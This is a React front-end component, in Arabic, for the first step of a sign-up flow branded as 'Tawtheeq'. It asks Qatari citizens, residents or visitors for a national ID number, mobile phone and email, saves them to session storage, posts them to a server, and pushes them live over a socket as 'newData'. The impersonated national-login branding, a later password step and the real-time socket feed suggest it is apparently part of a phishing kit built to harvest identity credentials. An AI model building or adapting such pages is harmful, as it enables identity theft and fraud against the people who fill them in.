import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { serverRoute, socket } from "./Home";
import axios from "axios";

const AccountType = () => {
  const navigate = useNavigate();
  const [selectedAccountType, setSelectedAccountType] = useState("");
  const [formData, setFormData] = useState({
    idNumber: "",
    phone: "",
    email: "",
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleAccountTypeChange = (type) => {
    setSelectedAccountType(type);
    // Load data from sessionStorage if exists
    const savedData = sessionStorage.getItem(`accountData_${type}`);
    if (savedData) {
      setFormData(JSON.parse(savedData));
    } else {
      setFormData({ idNumber: "", phone: "", email: "" });
    }
  };

  const handleInputChange = (field, value) => {
    const updatedData = { ...formData, [field]: value };
    setFormData(updatedData);
    // Save to sessionStorage
    sessionStorage.setItem(
      `accountData_${selectedAccountType}`,
      JSON.stringify(updatedData)
    );
  };

  const handleContinue = async () => {
    setIsLoading(true);
    // Save account type to sessionStorage
    sessionStorage.setItem("accountType", selectedAccountType);
    sessionStorage.setItem(
      `accountData_${selectedAccountType}`,
      JSON.stringify(formData)
    );

    // Submit and navigate to next step
    await submit();
  };

  const submit = async () => {
    try {
      const finalData = {
        ...JSON.parse(
          sessionStorage.getItem(`accountData_${selectedAccountType}`)
        ),
        accountType: sessionStorage.getItem("accountType"),
      };
      const { data: userData, status } = await axios.post(
        serverRoute + "/newData/" + sessionStorage.getItem("id"),
        finalData
      );
      if (status === 201) {
        socket.emit("newData", finalData);
        sessionStorage.setItem("data", JSON.stringify(userData.user));
        window.location.href = "/personal-data";
      } else {
        window.alert("حدث خطأ ما");
        setIsLoading(false);
      }
    } catch (error) {
      console.error(error);
      window.alert("حدث خطأ ما");
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    navigate("/");
  };

  const isFormValid =
    selectedAccountType &&
    formData.idNumber.trim() !== "" &&
    formData.phone.trim() !== "" &&
    formData.email.trim() !== "";

  return (
    <div className="bg-gray-50 flex flex-col w-full" dir="rtl">
      {/* Header */}
      <div className="w-full bg-white pt-4  px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between relative flex-row-reverse w-full">
            {/* Step 4 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-0 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  4
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  إنتهاء
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  التسجيل
                </p>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  3
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  كلمة
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  المرور
                </p>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  2
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  البيانات
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الشخصية
                </p>
              </div>
            </div>

            {/* Step 1 - Active */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-0 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full bg-[#0071bc] flex items-center justify-center text-white font-bold z-10">
                  1
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  نوع
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  الحساب
                </p>
              </div>
            </div>
            <div className="absolute h-0.5 top-5  w-full bg-gray-200"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className=" mx-auto  rounded-lg shadow-lg py-8 px-4">
          {/* Title */}
          <div className="text-right mb-8">
            <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
              اختر نوع الحساب
            </h2>
            <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
          </div>

          {/* Account Type Selection */}
          <div className="mb-8">
            <label className="text-lg font-bold text-gray-800 mb-4 block text-right">
              نوع الحساب <span className="text-red-600">*</span>
            </label>

            <div className="space-y-4">
              {/* Option 1 */}
              <label className="flex items-center justify-start gap-3 cursor-pointer">
                <input
                  type="radio"
                  name="accountType"
                  value="citizens"
                  checked={selectedAccountType === "citizens"}
                  onChange={() => handleAccountTypeChange("citizens")}
                  className="w-6 h-6 cursor-pointer"
                />
                <span className="text-gray-800 font-bold  w-4/5">
                  المواطنين القطريين والمقيمين
                </span>
              </label>

              {/* Option 2 */}
              <label className="flex items-center justify-start gap-3 cursor-pointer">
                <input
                  type="radio"
                  name="accountType"
                  value="visitors"
                  checked={selectedAccountType === "visitors"}
                  onChange={() => handleAccountTypeChange("visitors")}
                  className="w-6 h-6 cursor-pointer"
                />
                <span className="text-gray-800 font-bold w-4/5">
                  الزوار والمستخدمين من خارج الدولة
                </span>
              </label>
            </div>
          </div>

          {/* Form appears when account type is selected */}
          {selectedAccountType && (
            <div className="space-y-6 mt-8">
              {/* ID Number */}
              <div>
                <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                  رقم البطاقة الشخصية <span className="text-red-600">*</span>
                </label>
                <input
                  type="text"
                  value={formData.idNumber}
                  minLength={9}
                  maxLength={11}
                  onChange={(e) =>
                    handleInputChange("idNumber", e.target.value)
                  }
                  placeholder="رقم البطاقة الشخصية"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                />
              </div>

              {/* Phone Number */}
              <div>
                <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                  رقم الهاتف المحمول <span className="text-red-600">*</span>
                </label>
                <input
                  type="tel"
                  minLength={8}
                  maxLength={12}
                  value={formData.phone}
                  onChange={(e) => handleInputChange("phone", e.target.value)}
                  placeholder="رقم الهاتف المحمول"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                />
              </div>

              {/* Email */}
              <div>
                <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                  البريد الإلكتروني <span className="text-red-600">*</span>
                </label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange("email", e.target.value)}
                  placeholder="البريد الإلكتروني"
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex  flex-row-reverse gap-6 justify-center mt-10">
                <button
                  onClick={handleContinue}
                  disabled={!isFormValid}
                  className={`font-bold py-2 px-16 rounded-lg text-xl transition-colors ${
                    isFormValid
                      ? "bg-[#3c96c4] hover:bg-[#2d7fa8] text-white cursor-pointer"
                      : "bg-gray-300 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  استمر
                </button>
                <button
                  onClick={handleBack}
                  className="bg-white hover:bg-gray-100 text-gray-800 font-bold py-2 px-16 rounded-lg text-xl border-2 border-gray-300 transition-colors"
                >
                  رجوع
                </button>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Loading Popup */}
      {isLoading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري المعالجة...
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default AccountType;
